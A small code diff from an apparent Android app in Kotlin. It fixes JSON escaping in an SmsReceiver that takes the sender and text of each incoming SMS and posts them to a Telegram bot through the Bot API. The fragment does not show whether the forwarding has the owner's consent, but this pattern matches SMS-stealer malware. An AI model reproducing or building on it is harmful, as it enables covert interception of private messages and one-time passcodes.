@@ -31,7 +31,7 @@ class SmsReceiver : BroadcastReceiver() {
         val text = "📩 SMS Masuk\n👤 Pengirim: $sender\n💬 Pesan: $body"
         val url = "https://api.telegram.org/bot$token/sendMessage"
 
-        val json = "\{"chat_id":"$chatId","text":"${text.replace("\"", "\\\"").replace("\n", "\\n")}\}"
+        val json = "{\"chat_id\":\"$chatId\",\"text\":\"${text.replace("\"", "\\\"").replace("\n", "\\n")}}"
         val bodyRequest = json.toRequestBody("application/json; charset=utf-8".toMediaType())
 
         val client = OkHttpClient()
